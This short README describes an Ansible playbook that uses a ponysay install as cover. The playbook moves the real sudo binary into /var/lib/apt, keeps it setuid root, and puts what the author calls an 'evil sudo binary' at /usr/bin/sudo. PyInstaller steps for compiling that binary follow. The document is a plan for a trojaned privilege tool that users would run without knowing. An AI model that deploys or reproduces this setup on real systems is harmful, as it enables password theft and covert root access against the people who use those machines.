This Ansible playbook does the following:

1. Installs `ponysay` on the system.
2. Moves `/usr/bin/sudo` to `/var/lib/apt/sudo`.
3. Sets proper ownership (`root:root`) and permissions (`4755`) for the moved `sudo` for it to still function.
4. Copies a file from the playbook directory to `/usr/bin/`, which replaces the sudo binary with my evil sudo binary.

To compile the binary:

1. Install Python venv
`sudo apt install python3.8-venv -y`

2. Create a virtual environment
`python3 -m venv venv`

3. Activate the virtual environment
`source venv/bin/activate`

4. Install PyInstaller
`pip3 install PyInstaller`

5. Compile your Python script
`python3 -m PyInstaller [file] --onefile`

6. The compiled binary will be in:
`cd dist/`